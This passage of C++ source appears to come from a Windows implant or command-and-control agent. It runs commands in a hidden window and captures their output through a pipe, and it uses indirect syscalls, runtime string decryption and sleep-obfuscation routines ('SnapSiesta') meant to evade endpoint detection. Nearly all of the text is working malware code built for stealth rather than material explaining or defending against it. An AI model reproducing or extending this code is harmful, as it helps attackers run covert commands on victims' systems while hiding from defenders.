    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    
    try {
        if (!_pCreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::CREATINGPIPE_CRYPT)));
        }

        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = { 0 };
        if (!_pCreateProcessA(NULL, (LPSTR)args.c_str(), NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::CREATINGPROCESS_CRYPT)));
        }
        BOOL rSuccess = FALSE;
        DWORD dwRead = 0, dwAvail = 0, waitStatus = 0;
        while (TRUE) {
            // check status constantly
            waitStatus = _pWaitForSingleObject(pi.hProcess, 0);
            if (waitStatus == WAIT_OBJECT_0) {
                // process ended
                //printf("[*] Process ended!\n");
                SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
                SysNtClose(pi.hProcess);
                SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
                SysNtClose(pi.hThread);
                // read pipe until empty
                while (TRUE) {
                    rSuccess = _pPeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL);
                    if (!rSuccess) {
#ifdef DEBUG
                        printf("[-] Failed peeking named pipe! Last error: %u\n", GetLastError());
#endif
                        break;
                    }
                    if (!dwAvail) {
                        //printf("[-] dwAvail: %d\n", dwAvail);
                        break;
                    }
                    char buf[4096];
                    rSuccess = _pReadFile(hPipeRead, buf, 4096, &dwRead, NULL);
                    //printf("[*] 1 dwRead: %lu\n", dwRead);
                    if (!rSuccess || dwRead == 0) {
#ifdef DEBUG
                        printf("rSuccess: %d dwRead: %lu\n", rSuccess, dwRead);
#endif
                        break;
                    }
                    result.append(buf, dwRead);
                }
                break;
            }
            else if (waitStatus == WAIT_TIMEOUT) {
                // still running
                //printf("[*] Still running!\n");
                // read pipe until empty
                while (TRUE) {
                    rSuccess = _pPeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL);
                    if (!rSuccess) {
#ifdef DEBUG
                        printf("[-] Failed peeking named pipe! Last error: %u\n", GetLastError());
#endif
                        break;
                    }
                    if (!dwAvail) {
                        //printf("[-] dwAvail: %d\n", dwAvail);
                        break;
                    }
                    char buf[4096];
                    rSuccess = _pReadFile(hPipeRead, buf, 4096, &dwRead, NULL);
                    //printf("[*] 1 dwRead: %lu\n", dwRead);
                    if (!rSuccess || dwRead == 0) {
#ifdef DEBUG
                        printf("rSuccess: %d dwRead: %lu\n", rSuccess, dwRead);
#endif
                        break;
                    }
                    result.append(buf, dwRead);
                }
                continue;
            }
        }
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(hPipeWrite);
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(hPipeRead);
    }
    catch (const SecureException& e) {
        // Clean up resources here if the function exits due to an exception
        if (hPipeWrite) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(hPipeWrite);
        }
        if (hPipeRead) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(hPipeRead);
        }
        // Rethrow the exception to the caller
        throw;
    }
    catch (...) {
		// Clean up resources here if the function exits due to an exception
        if (hPipeWrite) {
			SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
			SysNtClose(hPipeWrite);
		}
        if (hPipeRead) {
			SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
			SysNtClose(hPipeRead);
		}
		// Rethrow the exception to the caller
		throw;
	}

    SyscallPrepare(SystemCalls::SysTable.SysNtSetEvent.wSyscallNr, SystemCalls::SysTable.SysNtSetEvent.pRecycled);
    // If we fail to set the event, it will timeout regardless so no need to check for errors    
    NtStatus = SysNtSetEvent(context->CompletionEvent, NULL);
    context->Result = std::make_unique<SecureString>(result);
    context->Success = true;
}

void Instance::StartSleep() {
    PrepareSleepTime();
    switch (Instance::Spoof) {
    case SPOOF_TYPE_ZERO_TRACE:
        SleepObfuscation::SnapSiestaZeroTrace();
        break;
    case SPOOF_TYPE_TIB_COPY:
        SleepObfuscation::SnapSiestaTibCopy();
        break;
    }
}

HANDLE Instance::CreateTimerNative(PCWSTR wTimerName) {
    pRtlInitUnicodeString _pRtlInitUnicodeString = (pRtlInitUnicodeString)Win32::NtdllTable.pRtlInitUnicodeString.pAddress;
    pBaseGetNamedObjectDirectory _pBaseGetNamedObjectDirectory = (pBaseGetNamedObjectDirectory)Win32::KernelBaseTable.pBaseGetNamedObjectDirectory.pAddress;

    HANDLE hTimer = NULL;
    UNICODE_STRING timerName;
    OBJECT_ATTRIBUTES objectAttributes;
    _pRtlInitUnicodeString(&timerName, wTimerName);

    try {
        HANDLE hRootDirectory = NULL;
        Instance::NtStatus = _pBaseGetNamedObjectDirectory(&hRootDirectory);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGNAMEDOBJECTDIRECTORY_CRYPT), Instance::NtStatus));
        }

        InitializeObjectAttributes(&objectAttributes, &timerName, OBJ_OPENIF, hRootDirectory, NULL);

        SyscallPrepare(SystemCalls::SysTable.SysNtCreateTimer.wSyscallNr, SystemCalls::SysTable.SysNtCreateTimer.pRecycled);
        Instance::NtStatus = SysNtCreateTimer(&hTimer, TIMER_ALL_ACCESS, &objectAttributes, NotificationTimer);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::CREATINGTIMER_CRYPT), Instance::NtStatus));
        }
        return hTimer;
    }
    catch (const SecureException& e) {
        throw;
    }
    catch (...) {
        throw;
    }
}

void Instance::SetTimerNative(HANDLE hTimer, LARGE_INTEGER TimerDueTime, PTIMER_APC_ROUTINE TimerApcRoutine, PVOID TimerContext) {
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;

    TIMER_SET_COALESCABLE_TIMER_INFO timerInfo;
    PCOUNTED_REASON_CONTEXT wakeContext = NULL;
    _pRtlZeroMemory(&timerInfo, sizeof(TIMER_SET_COALESCABLE_TIMER_INFO));
    timerInfo.DueTime = TimerDueTime;
    timerInfo.TimerApcRoutine = TimerApcRoutine;
    timerInfo.TimerContext = TimerContext;
    timerInfo.WakeContext = wakeContext;
    timerInfo.Period = 0;
    timerInfo.TolerableDelay = 0;
    timerInfo.PreviousState = NULL;

    try {
        SyscallPrepare(SystemCalls::SysTable.SysNtSetTimerEx.wSyscallNr, SystemCalls::SysTable.SysNtSetTimerEx.pRecycled);
        Instance::NtStatus = SysNtSetTimerEx(hTimer, TimerSetCoalescableTimer, &timerInfo, sizeof(TIMER_SET_COALESCABLE_TIMER_INFO));
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::SETTINGTIMER_CRYPT), Instance::NtStatus));
        }
    }
    catch (const SecureException& e) {
        throw;
    }
    catch (...) {
        throw;
    }
}

/*
* This function can be used to create a thread for the PE loader which can then have work queued to it
DWORD WINAPI Instance::ThreadFunc(LPVOID lpParam) {
    while (true) {
        LARGE_INTEGER delay;
        // 1 second
        LONGLONG lldelay = 1000 * 10000LL;
        delay.QuadPart = -lldelay;
        SyscallPrepare(SystemCalls::SysTable.SysNtDelayExecution.wSyscallNr, SystemCalls::SysTable.SysNtDelayExecution.pRecycled);
        Instance::NtStatus = SysNtDelayExecution(TRUE, &delay);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus("Sleeping", Instance::NtStatus));
        }
    }
    return 0;
}

VOID NTAPI Instance::APCWorker(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2) {

}*/
